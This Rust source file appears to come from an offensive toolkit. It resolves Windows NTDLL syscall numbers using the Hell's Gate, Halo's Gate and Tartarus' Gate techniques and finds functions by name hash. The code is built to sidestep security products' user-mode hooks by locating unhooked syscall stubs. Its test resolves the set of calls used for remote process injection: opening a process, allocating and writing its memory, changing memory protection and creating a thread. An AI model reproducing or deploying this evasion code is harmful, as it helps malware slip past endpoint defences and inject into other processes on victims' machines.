use core::ptr;

use crate::ntdll_config::NtdllConfig;
use crate::utils::{dbj2_hash, get_cstr_len};

const UP: isize = -32;
const DOWN: usize = 32;

pub struct NtSyscall {
    /// The number of the syscall
    pub number: u16,
    /// The address of the syscall
    pub address: *mut u8,
    /// The hash of the syscall (used for lookup)
    pub hash: usize,
}

/// Retrieves the syscall number from a given address.
///     
/// ### Safety
///
/// This function involves unsafe operations and raw pointer dereferencing.
///
/// ### Parameters
///
/// - `address`: A pointer to the start of the syscall instruction.
///
/// ### Returns
///
/// The syscall number as a `u16`. Returns 0 if the address is null or the syscall number cannot be determined.
pub unsafe fn get_syscall_number(address: *mut u8) -> u16 {
    //Check if address is null
    if address.is_null() {
        return 0;
    }

    // Hell's gate
    // check if the assembly instruction are:
    // mov r10, rcx
    // mov rcx, <syscall>
    if address.read() == 0x4c
        && address.add(1).read() == 0x8b
        && address.add(2).read() == 0xd1
        && address.add(3).read() == 0xb8
        && address.add(6).read() == 0x00
        && address.add(7).read() == 0x00
    {
        let high = address.add(5).read();
        let low = address.add(4).read();
        return ((high.overflowing_shl(8).0) | low) as u16;
    }

    // Halo's Gate Patch
    if address.read() == 0xe9 {
        for idx in 1..500 {
            // if hooked check the neighborhood to find clean syscall (downwards)
            if address.add(idx * DOWN).read() == 0x4c
                && address.add(1 + idx * DOWN).read() == 0x8b
                && address.add(2 + idx * DOWN).read() == 0xd1
                && address.add(3 + idx * DOWN).read() == 0xb8
                && address.add(6 + idx * DOWN).read() == 0x00
                && address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = address.add(5 + idx * DOWN).read();
                let low: u8 = address.add(4 + idx * DOWN).read();
                return ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
            }

            // if hooked check the neighborhood to find clean syscall (upwards)
            if address.offset(idx as isize * UP).read() == 0x4c
                && address.offset(1 + idx as isize * UP).read() == 0x8b
                && address.offset(2 + idx as isize * UP).read() == 0xd1
                && address.offset(3 + idx as isize * UP).read() == 0xb8
                && address.offset(6 + idx as isize * UP).read() == 0x00
                && address.offset(7 + idx as isize * UP).read() == 0x00
            {
                let high: u8 = address.offset(5 + idx as isize * UP).read();
                let low: u8 = address.offset(4 + idx as isize * UP).read();
                return ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
            }
        }
    }

    // Tartarus' Gate Patch
    if address.add(3).read() == 0xe9 {
        for idx in 1..500 {
            if address.add(idx * DOWN).read() == 0x4c
                && address.add(1 + idx * DOWN).read() == 0x8b
                && address.add(2 + idx * DOWN).read() == 0xd1
                && address.add(3 + idx * DOWN).read() == 0xb8
                && address.add(6 + idx * DOWN).read() == 0x00
                && address.add(7 + idx * DOWN).read() == 0x00
            {
                let high: u8 = address.add(5 + idx * DOWN).read();
                let low: u8 = address.add(4 + idx * DOWN).read();
                return ((high.overflowing_shl(8).0) | low - idx as u8) as u16;
            }

            // if hooked check the neighborhood to find clean syscall (upwards)
            if address.offset(idx as isize * UP).read() == 0x4c
                && address.offset(1 + idx as isize * UP).read() == 0x8b
                && address.offset(2 + idx as isize * UP).read() == 0xd1
                && address.offset(3 + idx as isize * UP).read() == 0xb8
                && address.offset(6 + idx as isize * UP).read() == 0x00
                && address.offset(7 + idx as isize * UP).read() == 0x00
            {
                let high: u8 = address.offset(5 + idx as isize * UP).read();
                let low: u8 = address.offset(4 + idx as isize * UP).read();
                return ((high.overflowing_shl(8).0) | low + idx as u8) as u16;
            }
        }
    }

    return 0;
}

/// Resolves the address of a syscall by searching the export table of NTDLL for the function
/// name that matches the given hash.
///
/// ### Safety
///
/// This function involves unsafe operations and raw pointers, which require careful handling.
///
/// ### Parameters
///
/// - `ntdll_config`: A reference to an `NtdllConfig` struct containing the configuration of NTDLL.
/// - `function_hash`: The hash of the function to be resolved.
///
/// ### Returns
///
/// A pointer to the address of the resolved syscall function. Returns a null pointer if the function is not found.
pub unsafe fn get_syscall_addr(ntdll_config: &NtdllConfig, function_hash: usize) -> *mut u8 {
    // Create a slice from the array of names in the export directory
    let names = core::slice::from_raw_parts(
        ntdll_config.array_of_names,
        ntdll_config.number_of_functions as _,
    );

    // Create a slice from the array of addresses in the export directory
    let functions = core::slice::from_raw_parts(
        ntdll_config.array_of_addresses,
        ntdll_config.number_of_functions as _,
    );

    // Create a slice from the array of ordinals in the export directory
    let ordinals = core::slice::from_raw_parts(
        ntdll_config.array_of_ordinals,
        ntdll_config.number_of_functions as _,
    );

    // Iterate over the names to find the function with the matching hash
    for i in 0..ntdll_config.number_of_functions {
        // Get the address of the current export name
        let name_addr =
            (ntdll_config.module_base as usize + names[i as usize] as usize) as *const i8;
        // Get the length of the C string
        let name_len = get_cstr_len(name_addr as _);
        // Create a slice for the name
        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);

        // Check if the hash of the name matches the given hash
        if function_hash as u32 == dbj2_hash(name_slice) {
            // Get the ordinal for the function
            let ordinal = ordinals[i as usize] as usize;
            return (ntdll_config.module_base as usize + functions[ordinal] as usize) as *mut u8;
        }
    }

    // Return null pointer if function is not found
    return ptr::null_mut();
}

/// Initializes a new `NtSyscall` by resolving the function address and obtaining the syscall number.
///
/// ### Safety
///
/// This function involves unsafe operations and raw pointers, which require careful handling.
///
/// ### Parameters
///
/// - `ntdll_config`: A reference to an `NtdllConfig` struct containing the configuration of NTDLL.
/// - `hash`: The hash of the function to be resolved.
///
/// ### Returns
///
/// An `NtSyscall` struct containing the syscall number, address, and hash.
pub fn init_syscall(ntdll_config: &NtdllConfig, hash: usize) -> NtSyscall {
    // Initialize NtSyscall struct with default values
    let mut nt_syscall = NtSyscall {
        number: 0,
        address: ptr::null_mut(),
        hash: 0,
    };

    // Resolve function address from NTDLL
    nt_syscall.address = unsafe { get_syscall_addr(ntdll_config, hash) };

    // Get syscall number using Hell's, Halo's, and Tartarus' Gate approach
    nt_syscall.number = unsafe { get_syscall_number(nt_syscall.address) };

    // Set the hash
    nt_syscall.hash = hash;

    return nt_syscall;
}

mod tests {

    #[test]
    fn resolve_syscall() {
        use super::init_syscall;
        use crate::ntdll_config::NtdllConfig;
        use core::ptr;
        use libc_print::libc_println;

        const NT_OPEN_PROCESS_HASH: usize = 0x4b82f718;
        const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
        const NT_PROTECT_VIRTUAL_MEMORY: usize = 0x50e92888;
        const NT_WRITE_VIRTUAL_MEMORY: usize = 0xc3170192;
        const NT_CREATE_THREAD_EX: usize = 0xaf18cfb0;

        let ntdll_config = match unsafe { NtdllConfig::instance() } {
            Ok(ntdll_config) => ntdll_config,
            Err(e) => {
                libc_println!("Error: {:?}", e);
                return assert!(false); // Fail the test if there's an error
            }
        };

        let nt_open_process_table = init_syscall(&ntdll_config, NT_OPEN_PROCESS_HASH);
        assert_ne!(nt_open_process_table.address, ptr::null_mut());

        let nt_allocate_virtual_memory_table =
            init_syscall(&ntdll_config, NT_ALLOCATE_VIRTUAL_MEMORY);
        assert_ne!(nt_allocate_virtual_memory_table.address, ptr::null_mut());

        let nt_protect_virtual_memory_table =
            init_syscall(&ntdll_config, NT_PROTECT_VIRTUAL_MEMORY);
        assert_ne!(nt_protect_virtual_memory_table.address, ptr::null_mut());

        let nt_write_virtual_memory_table = init_syscall(&ntdll_config, NT_WRITE_VIRTUAL_MEMORY);
        assert_ne!(nt_write_virtual_memory_table.address, ptr::null_mut());

        let nt_create_thread_ex_table = init_syscall(&ntdll_config, NT_CREATE_THREAD_EX);
        assert_ne!(nt_create_thread_ex_table.address, ptr::null_mut());

        libc_println!(
            "[+] NtOpenProcess: {:p} Syscall: {:#x}",
            nt_open_process_table.address,
            nt_open_process_table.number
        );

        libc_println!(
            "[+] NtAllocateVirtualMemory: {:p} Syscall: {:#x}",
            nt_allocate_virtual_memory_table.address,
            nt_allocate_virtual_memory_table.number
        );

        libc_println!(
            "[+] NtProtectVirtualMemory: {:p} Syscall: {:#x}",
            nt_protect_virtual_memory_table.address,
            nt_protect_virtual_memory_table.number
        );

        libc_println!(
            "[+] NtWriteVirtualMemory: {:p} Syscall: {:#x}",
            nt_write_virtual_memory_table.address,
            nt_write_virtual_memory_table.number
        );

        libc_println!(
            "[+] NtCreateThreadEx: {:p} Syscall: {:#x}",
            nt_create_thread_ex_table.address,
            nt_create_thread_ex_table.number
        );

        // Tested on Win11 23H2 22631.3593
        assert_eq!(nt_open_process_table.number, 0x26);
        assert_eq!(nt_allocate_virtual_memory_table.number, 0x18);
        assert_eq!(nt_protect_virtual_memory_table.number, 0x50);
        assert_eq!(nt_write_virtual_memory_table.number, 0x3a);
        assert_eq!(nt_create_thread_ex_table.number, 0xc7);
    }
}
